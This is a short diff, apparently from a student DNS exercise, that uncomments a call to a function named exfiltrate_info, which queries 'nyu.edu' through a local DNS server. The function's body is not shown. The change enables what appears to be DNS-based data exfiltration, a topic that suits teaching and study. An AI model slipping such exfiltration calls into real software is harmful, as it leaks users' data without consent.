@@ -70,4 +70,4 @@ if __name__ == '__main__':
     result = query_local_dns_server("nyu.edu", question_type, local_host_ip)
     print(result)
     
-    #print(exfiltrate_info("nyu.edu", question_type, local_host_ip))
+    print(exfiltrate_info("nyu.edu", question_type, local_host_ip))
